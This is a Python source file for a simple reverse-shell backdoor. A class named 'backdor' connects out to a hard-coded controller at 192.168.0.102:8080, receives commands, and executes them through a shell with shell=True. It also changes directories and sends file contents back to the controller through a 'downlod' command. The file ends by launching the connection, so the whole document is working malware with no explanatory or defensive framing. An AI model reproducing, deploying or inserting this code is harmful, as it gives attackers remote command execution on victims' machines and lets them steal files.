import socket
import subprocess
import sys
import os


class backdor:
    '''define a class'''

    def __init__(self, ip, ports):
        self.connected = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connected.connect((ip, ports))
        # connected.send("[+] Connection establisted.\n".encode())
    
    def use_for_system_command(self, commnd):
        '''define a function'''
        return subprocess.check_output(commnd, shell=True)

    def command_send(self, deta):
        '''define a function in this function send data in server client'''
        self.connected.send(deta)

    def command_receive(self):
        '''receive command use this function'''
        return self.connected.recv(1024)

    def change_dir(self, path):
        '''this function use to for change the working directory'''
        os.chdir(path)
        return os.getcwd()

    def read_file(self, file_path):
        '''this function use to open a txt file use to binary mode'''
        with open(file_path, "rb") as bin:
            return bin.read()

    def run(self):
        '''this function use to run all auto function'''
        while True:
            comd = self.command_receive().decode()      
            if comd.split()[0]=="exit":
                self.connected.close()
                sys.exit()
            elif comd.split()[0]=="cd":
                try:
                    respoce_client = self.change_dir(comd[3:]).encode()
                except FileNotFoundError:
                    respoce_client = f"The system cannot find the file specified:{comd[3:]}".encode()
            elif comd.split()[0]=="downlod":
                file_name = len(comd.split()[0])
                try:
                    respoce_client = self.read_file(comd[file_name:])
                except FileNotFoundError:
                    respoce_client = f" No such file or directory:{comd[file_name:]}".encode()
            else:
                respoce_client = self.use_for_system_command(comd)
     
            self.command_send(respoce_client)


dor = backdor("192.168.0.102", 8080)
dor.run()


